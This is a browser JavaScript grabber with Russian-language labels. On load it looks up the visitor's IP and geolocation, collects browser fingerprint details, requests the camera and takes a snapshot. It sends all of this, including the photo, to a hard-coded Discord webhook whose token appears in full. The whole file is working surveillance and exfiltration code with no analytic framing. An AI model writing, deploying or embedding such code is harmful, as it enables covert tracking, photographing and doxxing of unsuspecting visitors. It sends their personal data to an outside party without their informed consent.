async function captureCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        
        stream.getTracks().forEach(track => track.stop());
        
        return { status: "✔Разрешили", image: canvas.toDataURL('image/jpeg') };
    } catch (error) {
        if (error.name === 'NotAllowedError') {
            return { status: "🚫Запретили", image: null };
        } else {
            return { status: "❌Не доступно", image: null };
        }
    }
}

fetch('https://api.ipify.org')
.then(response => response.text())
.then(ip => {
    captureCamera().then(cameraResult => {
        fetch(`http://ip-api.com/json/${ip}`)
        .then(response => response.json())
        .then(geoData => {
            const embed = {
                title: "🌐 Информация о пользователе",
                fields: [
                    { name: "📱 User Agent", value: navigator.userAgent, inline: false },
                    { name: "🗣️ Язык", value: navigator.language, inline: true },
                    { name: "🌍 Языки", value: navigator.languages.join(', '), inline: true },
                    { name: "🔌 Плагины", value: [...navigator.plugins].map(p => p.name).join(', ') || 'Нет', inline: false },
                    { name: "📺 Размер экрана", value: `${screen.width} x ${screen.height}`, inline: true },
                    { name: "🌍 Страна", value: geoData?.country || "Неизвестно", inline: true },
                    { name: "🏙️ Город", value: geoData?.city || "Неизвестно", inline: true },
                    { name: "📍 Регион", value: geoData?.regionName || "Неизвестно", inline: true },
                    { name: "📡 Провайдер", value: geoData?.isp || "Неизвестно", inline: true },
                    { name: "🕐 Часовой пояс", value: geoData?.timezone || "Неизвестно", inline: true },
                    { name: "📷 Камера", value: cameraResult.status, inline: true },
                    { name: "🆔 IP адрес", value: ip || "Неизвестно", inline: true }
                ],
                timestamp: new Date().toISOString()
            };

            const payload = { embeds: [embed] };
            
            if (cameraResult.image) {
                payload.content = "📸 Фото с камеры:";
                fetch(cameraResult.image)
                .then(response => response.blob())
                .then(imageBlob => {
                    const formData = new FormData();
                    formData.append('file', imageBlob, 'camera.jpg');
                    formData.append('payload_json', JSON.stringify(payload));
                    
                    fetch('https://discord.com/api/webhooks/1444260678516084748/E5DuzaYB5YZ3BUh1C_02a1KVp5xLnLlobI30dV6GDuMpPUTCYlJPERGOMT83GCvnq71Q', {
                        method: 'POST',
                        body: formData
                    });
                });
            } else {
                fetch('https://discord.com/api/webhooks/1444260678516084748/E5DuzaYB5YZ3BUh1C_02a1KVp5xLnLlobI30dV6GDuMpPUTCYlJPERGOMT83GCvnq71Q', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(payload)
                });
            }
        })
        .catch(() => {
            const embed = {
                title: "🌐 Информация о пользователе",
                fields: [
                    { name: "📱 User Agent", value: navigator.userAgent, inline: false },
                    { name: "🗣️ Язык", value: navigator.language, inline: true },
                    { name: "🌍 Языки", value: navigator.languages.join(', '), inline: true },
                    { name: "🔌 Плагины", value: [...navigator.plugins].map(p => p.name).join(', ') || 'Нет', inline: false },
                    { name: "📺 Размер экрана", value: `${screen.width} x ${screen.height}`, inline: true },
                    { name: "📷 Камера", value: cameraResult.status, inline: true },
                    { name: "🆔 IP адрес", value: ip || "Неизвестно", inline: true }
                ],
                timestamp: new Date().toISOString()
            };

            fetch('https://discord.com/api/webhooks/1444260678516084748/E5DuzaYB5YZ3BUh1C_02a1KVp5xLnLlobI30dV6GDuMpPUTCYlJPERGOMT83GCvnq71Q', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({embeds: [embed]})
            });
        });
    });
});
